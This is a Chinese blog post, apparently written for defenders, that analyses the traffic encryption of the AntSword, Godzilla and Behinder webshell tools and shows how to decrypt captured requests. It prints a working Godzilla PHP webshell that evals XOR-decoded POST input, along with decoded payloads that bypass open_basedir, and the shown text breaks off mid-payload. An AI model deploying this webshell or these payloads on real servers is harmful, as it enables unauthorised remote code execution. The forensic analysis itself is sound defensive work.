{"title":"Webshell工具加密流量解析","uid":"06322427d537eca1634c7950b5477253","slug":"Webshell工具加密流量解析","date":"2022-07-19T11:48:45.000Z","updated":"2023-04-11T11:40:32.157Z","comments":true,"path":"api/articles/Webshell工具加密流量解析.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220722/bingxie.10ryoh4zjlxs.png","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯拉、冰蝎3.0这三款较为流行的工具在默认情况下的流量加密方式和解密方法，可以帮助守方在复盘时更好的攻击链还原和检测。</p>\n<h2 id=\"蚁剑\"><a href=\"#蚁剑\" class=\"headerlink\" title=\"蚁剑\"></a>蚁剑</h2><p>蚁剑的加密手段比较简单，在配置界面的加密手段只有base64和rot13，这两者都是无需密钥可直接进行解密的密码类型，这里以base64为例：<br><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220722/1.4jjh2zt6dim0.png\"><br>提取参数后的编码直接进行base64解码：</p>\n<pre class=\"line-numbers language-base64\" data-language=\"base64\"><code class=\"language-base64\">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb3BhcnI9cHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkb3BkaXIpOyRvY3dkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskdG1kaXI9Ii45ZjFlN2ZjODYiO0Bta2RpcigkdG1kaXIpO0BjaGRpcigkdG1kaXIpO0Bpbmlfc2V0KCJvcGVuX2Jhc2VkaXIiLCIuLiIpO2ZvcigkaT0wOyRpPHNpemVvZigkb3BhcnIpOyRpKyspe0BjaGRpcigiLi4iKTt9QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJG9jd2QuIi8iLiR0bWRpcik7fTtmdW5jdGlvbiBhc2VuYygkb3V0KXtyZXR1cm4gQGJhc2U2NF9lbmNvZGUoJG91dCk7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiMzU4ZGMiLiI1MjQyYiI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiNzkiLiJlNTUiO31vYl9zdGFydCgpO3RyeXtwaHBpbmZvKCk7CmVjaG8gImtpZCIKCjt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>解密内容：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">@<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>@<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$opdir</span><span class=\"token operator\">=</span>@<span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"open_basedir\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$opdir</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><span class=\"token variable\">$oparr</span><span class=\"token operator\">=</span><span class=\"token function\">preg_split</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\\\\\\\|\\//\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$opdir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$ocwd</span><span class=\"token operator\">=</span><span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SCRIPT_FILENAME\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$tmdir</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\".9f1e7fc86\"</span><span class=\"token punctuation\">;</span>@<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmdir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>@<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmdir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>@<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"open_basedir\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$oparr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>@<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>@<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"open_basedir\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>@<span class=\"token function\">rmdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ocwd</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$tmdir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">asenc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$out</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token keyword\">return</span> @<span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$out</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">asoutput</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$output</span><span class=\"token operator\">=</span><span class=\"token function\">ob_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">ob_end_clean</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"358dc\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"5242b\"</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> @<span class=\"token function\">asenc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$output</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"79\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"e55\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">try</span><span class=\"token punctuation\">{</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"kid\"</span>\n\n<span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ERROR://\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$e</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token function\">asoutput</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"哥斯拉\"><a href=\"#哥斯拉\" class=\"headerlink\" title=\"哥斯拉\"></a>哥斯拉</h2><p>哥斯拉自带了几种加密方式，这里以php为例：分别为PHP_EVEAL_XOR_BASE64、PHP_XOR_BASE64、PHP_XOR_RAW为例。</p>\n<h3 id=\"PHP-XOR-BASE64\"><a href=\"#PHP-XOR-BASE64\" class=\"headerlink\" title=\"PHP_XOR_BASE64\"></a>PHP_XOR_BASE64</h3><p>这个用哥斯拉生成的shell：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n@<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$K</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$K</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$payloadName</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$key</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'3c6e0b8a9c15224a'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$pass</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\n        <span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n            <span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\t\t<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pass</span><span class=\"token operator\">.</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pass</span><span class=\"token operator\">.</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"getBasicsInfo\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!==</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$payloadName</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>根据shell文件可以看出加密过程，先将pass传递内容base64解码，然后将内容与key进行异或操做，注意这里的key实际上是生成shell的key的32位md5的前16位。<br>那么我们根据这些即可写一个一次性的解码脚本，用第一次哥斯拉进行流量交互的payload为例（这里的key值为key）：<br><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220722/2.2l7h0knmmfe0.png\"><br>将内容url解码后放入脚本中<br>脚本如下：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n@<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$K</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$D</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$K</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$D</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$pass</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$payloadName</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'payload'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$key</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'3c6e0b8a9c15224a'</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#echo base64_decode($post);</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br/&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br/&gt;\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>解密结果如下：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$parameters</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$_SES</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">run</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pms</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">global</span> <span class=\"token variable\">$ERRMSG</span><span class=\"token punctuation\">;</span> <span class=\"token function\">reDefSystemFunc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$_SES</span><span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> @<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$sessioId</span><span class=\"token operator\">=</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$sessioId</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$_SES</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">S1MiwYYr</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64Decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$sessioId</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sessioId</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sessioId</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> @<span class=\"token function\">session_write_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">canCallGzipDecode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;&amp;</span>@<span class=\"token function\">isGzipStream</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pms</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$pms</span><span class=\"token operator\">=</span><span class=\"token function\">gzdecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pms</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token function\">formatParameter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pms</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"bypass_open_basedir\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$_SES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"bypass_open_basedir\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">bypass_open_basedir</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"set_error_handler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">set_error_handler</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"payloadErrorHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">function_existsEx</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"set_exception_handler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> @<span class=\"token function\">set_exception_handler</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"payloadExceptionHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token variable\">$result</span><span class=\"token operator\">=</span>@<span class=\"token function\">evalFunc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token operator\">==</span><span class=\"token keyword type-declaration\">null</span><span class=\"token operator\">||</span><span class=\"token variable\">$result</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token variable\">$ERRMSG</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">}</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SES</span><span class=\"token operator\">!==</span><span class=\"token constant\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$sessioId</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">S1MiwYYr</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token 